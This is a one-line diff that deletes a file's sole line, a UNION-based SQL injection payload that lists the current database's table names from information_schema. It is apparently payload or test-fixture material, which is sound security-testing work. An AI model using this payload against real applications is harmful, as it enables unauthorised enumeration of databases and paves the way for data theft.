@@ -1,1 +1,0 @@
-' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 -- -
